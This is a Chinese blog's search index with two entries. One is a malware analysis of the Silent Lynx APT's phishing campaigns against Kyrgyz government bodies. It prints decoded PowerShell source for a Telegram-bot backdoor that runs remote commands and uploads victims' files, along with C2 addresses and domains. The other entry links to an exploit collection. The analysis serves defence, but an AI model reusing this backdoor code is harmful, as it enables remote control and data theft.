<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Exploit Sets</title>
    <link href="/2025/01/23/Exploit-Sets/"/>
    <url>/2025/01/23/Exploit-Sets/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本EXP收集仅供学习使用，禁止用于非法用途</p><h2 id="2024-EXP-合集"><a href="#2024-EXP-合集" class="headerlink" title="2024 EXP 合集"></a>2024 EXP 合集</h2><p>公众号回复<code>2024EXP</code>获取提取码：</p><p><code>https://pan.baidu.com/s/1rBMd0BpT8tg_0dkWoVJhfw</code></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EXP</tag>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击</title>
    <link href="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/"/>
    <url>/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><pre><code class="hljs">最近遥测发现一批东欧地区的样本，同时 Seqrite 实验室的高级持续威胁团队（APT-Team）最近披露了一个新威胁组织发起的两次新活动，将其命名为 “沉默山猫”（Silent Lynx）。该威胁组织此前曾针对东欧和中亚地区参与经济决策的政府智囊团以及银行业机构发动攻击。此次活动的目标指向中亚经济特别计划（SPECA）的参与国之一 —— 吉尔吉斯斯坦。在此次攻击中，威胁组织发送了以联合国相关主题为诱饵的恶意邮件，目标是吉尔吉斯共和国国家银行的政府机构；而第二次活动则将矛头指向了吉尔吉斯斯坦财政部。在本博客中，我们将深入探讨在分析过程中遇到的这些活动的技术细节。我们将研究此次攻击活动的各个阶段，感染始于一封带有 RAR 附件的网络钓鱼邮件，附件中包含一个恶意 ISO 文件、一个良性诱饵文档以及一个恶意 C++ 有效载荷。该有效载荷包含经过编码的嵌入式 PowerShell 脚本，可作为入侵受害者计算机的远程访问工具。在第二次活动中，网络钓鱼邮件附带了一个受密码保护的 RAR 文件，其中包含一个诱饵文档和一个恶意 Golang 植入程序。我们还将审视整个活动背后的基础设施。</code></pre><h2 id="主要目标"><a href="#主要目标" class="headerlink" title="主要目标"></a>主要目标</h2><ul><li>大使馆</li><li>律师事务所</li><li>政府银行</li><li>政府智囊团</li></ul><h2 id="受影响的行业"><a href="#受影响的行业" class="headerlink" title="受影响的行业"></a>受影响的行业</h2><p>政府银行</p><h2 id="地理重点区域"><a href="#地理重点区域" class="headerlink" title="地理重点区域"></a>地理重点区域</h2><p>吉尔吉斯斯坦、土库曼斯坦</p><h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt.png" class="" title="ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt"><h1 id="活动一"><a href="#活动一" class="headerlink" title="活动一"></a>活动一</h1><table><thead><tr><th>文件类型</th><th>文件名</th><th>说明</th></tr></thead><tbody><tr><td>RAR</td><td>20241228140656.rar</td><td>包含恶意文件的压缩包</td></tr><tr><td>PDF</td><td>2024 - 00178nv Note Verbale SPECA WG_2024</td><td>诱饵文档</td></tr><tr><td>EXE</td><td>20241228140656.iso</td><td>恶意 ISO 文件，包含恶意可执行文件和诱饵文档</td></tr><tr><td>EXE</td><td>Xerox_Scan17510875802718752175.exe</td><td>恶意 C++ 可执行文件，用于启动恶意 PowerShell 进程</td></tr><tr><td>其他信息</td><td>PowerShell、Telegram Bot、south korea、south_africa、PasteBin 1010 等</td><td>涉及恶意脚本执行、通信及相关信息</td></tr></tbody></table><h3 id="初步调查结果"><a href="#初步调查结果" class="headerlink" title="初步调查结果"></a>初步调查结果</h3><pre><code class="hljs">2024 年 12 月 27 日，团队发现了一封针对吉尔吉斯共和国国家银行一位官员的恶意 Outlook 邮件。该邮件包含一个名为 20241228_140656.rar 的 RAR 压缩附件。在检查这个 RAR 文件时，我们发现了一个名为 20241228_140656.iso 的恶意 ISO 文件。这个 ISO 文件包含一个名为 Xerox_Scan17510875802718752175.exe 的恶意可执行文件，它会启动一个 PowerShell 进程。恶意 PowerShell 进程的参数以 Base64 编码形式嵌入在 C++ 可执行文件中。此外，该 ISO 文件还释放出一个名为 2024 - 00178nv Note Verbale_SPECA WG_2024 的诱饵文档。次日，其他威胁研究人员也发现了同样的文件。</code></pre><h3 id="恶意电子邮件分析"><a href="#恶意电子邮件分析" class="headerlink" title="恶意电子邮件分析"></a>恶意电子邮件分析</h3><pre><code class="hljs">查看这封恶意 Outlook 邮件后，我们明显发现威胁行为者使用了吉尔吉斯国家银行一名员工被攻陷的电子邮件账户。他们利用这个账户发送恶意 RAR 文件，并附上一条引人注意的消息，称该邮件本应发送给财政部，但却被他们收到了。现在，让我们来看看恶意 ISO 文件释放的诱饵 PDF 文档。</code></pre><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/6dc56b26-e7ea-4cc1-a40a-ffeb4b89a66b-20250122093059-m8wjpl7.png" class="" title="6dc56b26-e7ea-4cc1-a40a-ffeb4b89a66b-20250122093059-m8wjpl7"><h3 id="诱饵文档分析"><a href="#诱饵文档分析" class="headerlink" title="诱饵文档分析"></a>诱饵文档分析</h3><pre><code class="hljs">提取 ISO 文件后，我们识别出两个文件：一个恶意 C++ 可执行文件和一个诱饵文件。诱饵文件是一份参加 2024 年 4 月 3 日在乌兹别克斯坦撒马尔罕举行的中亚经济特别计划（SPECA）贸易工作组第十九届会议的邀请函。该文档模仿了联合国亚洲及太平洋经济社会委员会（ESCAP）的正式通信，利用 “利用数字化推动可持续供应链” 这一主题，使其看起来可信且具有相关性。由于吉尔吉斯斯坦是 SPECA 成员国之一，这种策略降低了人们的怀疑。</code></pre><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122093322-r6wxrru.png" class="" title="image-20250122093322-r6wxrru"><h1 id="活动二"><a href="#活动二" class="headerlink" title="活动二"></a>活动二</h1><table><thead><tr><th>文件类型</th><th>文件名</th><th>说明</th></tr></thead><tbody><tr><td>RAR</td><td>npka3 N9950 - 2 - o npemvpoBaH.rar</td><td>包含恶意文件的压缩包，受密码保护</td></tr><tr><td>PDF</td><td>Приказ №950 - 2 - ГП о премировании</td><td>诱饵文档，看似是吉尔吉斯共和国财政部发布的官方文件</td></tr><tr><td>EXE</td><td>Приложение №14 - 214 - 14 - 12 - 5 - 15docx</td><td>恶意 Golang 可执行文件</td></tr><tr><td>其他信息</td><td>185.122.171.22:8082、Google Drive、<a href="https://pweobmxdlboi.com/">pweobmxdlboi.com</a>、document.hometowncity.cloud、<a href="https://mailboxdownload.com/">mailboxdownload.com</a>等</td><td>涉及服务器地址、云存储及恶意域名信息</td></tr></tbody></table><h3 id="恶意电子邮件分析-1"><a href="#恶意电子邮件分析-1" class="headerlink" title="恶意电子邮件分析"></a>恶意电子邮件分析</h3><p>查看第二次活动中的恶意 Outlook 邮件，我们发现威胁行为者使用了与第一次活动完全相同的被攻陷的电子邮件账户。这次，他们发送了一个受密码保护的 RAR 文件，并附上一条以员工奖金为诱饵的紧急消息，目标是吉尔吉斯共和国财政部的员工。现在，让我们来看看从 RAR 文件中提取出的诱饵 PDF 文档。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105119-umhizqx.png" class="" title="image-20250122105119-umhizqx"><h3 id="诱饵文档分析-1"><a href="#诱饵文档分析-1" class="headerlink" title="诱饵文档分析"></a>诱饵文档分析</h3><p>提取恶意 RAR 文件后，我们发现了两个文件：一个名为Приложение №14 - 214 - 14 - 12 - 5 - 15docx 的恶意 Golang 可执行文件和一个名为Приказ №950 - 2 - ГП о премировании的诱饵 Word 文档。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105215-71evgop.png" class="" title="image-20250122105215-71evgop"><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105240-lwvmt0y.png" class="" title="image-20250122105240-lwvmt0y"><p>诱饵文档看似是吉尔吉斯共和国财政部发布的官方命令，详细说明了员工奖金的分配情况。它包含了多名员工的姓名以及命令发布日期 2025 年 1 月 8 日，使这个诱饵看起来既及时又相关。为了增强其合法性并减少怀疑，文档末尾还列出了一位政府官员的姓名。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105248-5htdfs1.png" class="" title="image-20250122105248-5htdfs1"><h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><h2 id="活动一-1"><a href="#活动一-1" class="headerlink" title="活动一"></a>活动一</h2><p><strong>第一阶段 —— 恶意 ISO 文件</strong>：RAR 文件包含一个名为 20241228_140656.iso 的恶意 ISO 文件。提取该 ISO 文件后，我们发现了一个诱饵 PDF 文档和一个恶意 C++ 二进制文件，后者充当加载器。接下来，我们将分析这个 C++ 二进制文件。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105429-vvjjlrc.png" class="" title="image-20250122105429-vvjjlrc"><p><strong>第二阶段 —— 恶意 C++ 加载器</strong>：在直接进行分析之前，我们可以确定该样本未被打包，是一个 C++ 二进制文件。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105454-50hmzzq.png" class="" title="image-20250122105454-50hmzzq"><p>分析后我们发现，恶意 C++ 可执行文件中存在一大段 Base64 编码的内容，并且有一个 PowerShell 命令，该命令使用 -ExecutionPolicy Bypass 标志运行编码脚本，从而实现无限制的脚本执行。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105518-tvyewwr.png" class="" title="image-20250122105518-tvyewwr"><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105525-qk51s5j.png" class="" title="image-20250122105525-qk51s5j"><p>最后，我们可以看到，通过 CreateProcess API 创建了一个 PowerShell 进程，用于执行编码后的内容块。在下一部分，我们将检查由这个加载器执行的 PowerShell 内容块的具体内容。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105531-9s5r6rk.png" class="" title="image-20250122105531-9s5r6rk"><p><strong>第三阶段 —— 恶意 PowerShell 脚本</strong>：解码 Base64 编码的脚本后，我们发现威胁行为者利用 Telegram Bot 来执行命令和进行数据窃取。该脚本包含两个有趣的函数，即 Invoke - BotCmd 和 Invoke - BotDownload。让我们来看看这些函数的工作原理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">Token = <span class="hljs-string">&quot;789858392:AAF5FPb]1j1PQfqCGnx - zNdw2R5tF_Xxte&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">URL = <span class="hljs-string">&quot;https://api.telegram.org/bot&#123;0&#125;&quot;</span> -f <span class="hljs-variable">$Token</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">lastID = 123</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sleepTime = 2</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sidentifier = -<span class="hljs-built_in">join</span> (48..57) | Get - Random -Count 5 | % &#123; [char] <span class="hljs-variable">$_</span> &#125;</span><br></code></pre></td></tr></table></figure><p>Invoke - BotCmd 函数主要用于执行从威胁行为者处接收的系统命令，并通过 Telegram Bot API 将执行命令的输出发送回用户。它将命令作为输入，使用 Invoke - Expression 运行该命令，并捕获输出或任何错误。结果会用一个唯一标识符进行格式化后发送回用户。如果输出超过 Telegram 的 4095 字符限制，它会被分割成多个块，并通过多条消息发送。对于较短的输出，则直接发送消息。因此，这个函数实现了通过 Telegram API 与受害者计算机进行远程命令执行和响应传递的功能。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">function Invoke - BotCmd &#123;<br>    param (<br>        $command<br>    )<br>    $result = Invoke - Expression ($command)<br>    catch &#123; $result = $Error[0].Exception &#125;<br>    $res = &quot;[&#123;0&#125;]%e%A&quot; -f $sidentifier<br>    $result | ForEach - Object &#123; $res += - [string] $_ + &quot;xD8A&quot; &#125;<br>    if ($res -eq &quot;&quot;) &#123; $lastID = $updateid; continue &#125;<br>    if ($res.Length -gt 4095) &#123;<br>        for ($i = 0; $i -lt $res.Length / 4095; $i++) &#123;<br>            $begin = $i * 4095<br>            $send = $begin + 4094<br>            if ($send -gt $res.Length) &#123;<br>                $send = $res.Length<br>            &#125;<br>            $data = &quot;chat_id=&#123;0&#125;&amp;text=&#123;1&#125;&quot; -f $from, $res[$begin..$send]<br>            $URL = &quot;&#123;0&#125;/sendMessage?&#123;1&#125;&quot; -f $URL, $data<br>            Invoke - WebRequest -Uri $URL &gt; $null<br>        &#125;<br>    &#125; else &#123;<br>        $data = &quot;chat_id=&#123;0&#125;&amp;text=&#123;1&#125;&quot; -f $from, $res<br>        $URL = &quot;&#123;0&#125;/sendMessage?&#123;1&#125;&quot; -f $URL, $data<br>        Invoke - WebRequest -Uri $URL &gt; $null<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Invoke - BotDownload 函数主要用于将受害者系统中的文件上传到由威胁行为者控制的 Telegram 聊天窗口，实现数据窃取。它根据威胁行为者的请求，从指定路径读取文件，准备必要的元数据和内容头，并将文件作为多部分表单数据 POST 请求发送到 Telegram API。因此，这个函数旨在将受害者计算机上的数据窃取到威胁行为者的 Telegram 聊天窗口中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">function Invoke - BotDownload &#123;<br>    param (<br>        $FilePath<br>    )<br>    Add - type -AssemblyName System.Net.Http<br>    $FieldName = &#x27;document&#x27;<br>    $httpclientHandler = New - Object System.Net.Http.HttpclientHandler<br>    $httpclient = New - Object System.Net.Http.Httpclient($httpclientHandler)<br>    $Filestream = [System.IO.FileStream]::new($FilePath, [System.IO.FileMode]::Open)<br>    $FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new(&quot;form - data&quot;)<br>    $FileHeader.Name = $FieldName<br>    $FileHeader.FileName = (Split - Path $FilePath -leaf)<br>    $FileContent = [System.Net.Http.StreamContent]::new($Filestream)<br>    $FileContent.Headers.ContentDisposition = $FileHeader<br>    $FileContent.Headers.ContentType = [System.Web.MimeMapping]::GetMimeMapping($FilePath)<br>    $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()<br>    $multipartContent.Add($FileContent)<br>    $httpClient.PostAsync(&quot;$URL/sendDocument?chat_id=&#123;0&#125;&quot; -f $from, $multipartContent) &gt; $null<br>&#125;<br></code></pre></td></tr></table></figure><p>脚本的其余部分构成了机器人的核心操作逻辑，它在一个持续循环中运行，以监控和处理来自威胁行为者的新消息。它使用 getUpdates API 端点获取消息，并根据消息内容采取行动。像 &#x2F;sleep 这样的命令可以调整机器人的休眠间隔，&#x2F;cmd 命令允许它使用 Invoke - BotCmd 函数执行系统命令，&#x2F;download 命令则通过 Invoke - BotDownload 函数触发从受害者计算机上传文件的操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">while ($true) &#123;<br>    try &#123;<br>        $message = Invoke - RestMethod -Method Get -Uri ($URL + &#x27;/getUpdates?offset=&#x27; + ($lastID + 1)) -ErrorAction Stop<br>        if ($message.result) &#123;<br>            foreach ($update in $message.result) &#123;<br>                $updateid = $update.update_id<br>                $from = $update.message.from.id<br>                $command = $update.message.text<br>                if ($command.Substring(0, 6) -eq &quot;/sleep&quot;) &#123;<br>                    $sleepTime = [int]$command.Substring(7)<br>                &#125; elseif ($command.Substring(0, 4) -eq &quot;/cmd&quot;) &#123;<br>                    Invoke - BotCmd -command $command.Substring(5)<br>                &#125; elseif ($command.Substring(0, 9) -eq &quot;/download&quot;) &#123;<br>                    Invoke - BotDownload -FilePath $command.Substring(10)<br>                &#125; else &#123;<br>                    # 处理其他命令或消息<br>                &#125;<br>                $lastID = $updateid<br>            &#125;<br>        &#125;<br>        Start - Sleep -Seconds (Get - Random -Minimum 1 -Maximum 8)<br>    &#125; catch &#123;<br>        Start - Sleep -Seconds (Get - Random -Minimum 1 -Maximum 8)<br>        continue<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于带有特定标识符的自定义命令，机器人在执行请求的操作之前会验证标识符。该脚本通过更新最后看到的消息 ID 来确保每条消息只被处理一次，并实现了错误处理功能，以便在 API 调用失败时进行重试，同时会随机暂停一段时间，以避免被检测到或因异常网络行为而导致过早被发现或出现其他异常情况。这个循环使得机器人能够执行诸如运行命令、窃取数据以及与威胁行为者保持持续通信等任务。</p><p>现在，我们已经完成了对 C++ 和 PowerShell 加载器的分析，接下来将研究基础设施、其他活动以及威胁行为者的其他活动。</p><h2 id="活动二-1"><a href="#活动二-1" class="headerlink" title="活动二"></a>活动二</h2><p><strong>第一阶段 —— 恶意 Golang 反向 Shell</strong>：提取恶意 RAR 文件后，我们可以看到里面只有两个文件，其中一个是诱饵文档，另一个是 Golang 可执行文件。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105800-o6g5cuc.png" class="" title="image-20250122105800-o6g5cuc"><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105815-csm17n2.png" class="" title="image-20250122105815-csm17n2"><p>查看该二进制文件内部，我们发现它是一个用 Golang 编写的反向 Shell，它使用 net_dial 等包连接到命令控制服务器（C2）。如果连接 C2 失败，它会休眠 0.5 秒，然后运行各种命令。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105820-fj0tt2w.png" class="" title="image-20250122105820-fj0tt2w"><img 